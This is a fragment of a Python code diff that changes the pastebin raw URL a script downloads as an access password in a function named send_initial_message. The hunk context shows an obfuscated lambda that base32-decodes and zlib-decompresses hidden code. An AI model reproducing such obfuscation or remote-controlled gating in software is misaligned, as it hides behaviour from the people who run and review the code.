@@ -98,7 +98,7 @@ _ = lambda __ : __import__('zlib').decompress(__import__('base64').b32decode(__[
 def send_initial_message():
 	#                      Your Password Link 
 	
-	mmm_pass = requests.get('https://pastebin.com/raw/kePKR3xW').text
+	mmm_pass = requests.get('https://pastebin.com/raw/Sb27RwGi').text
  
     if mmm_pass not in password:
     	
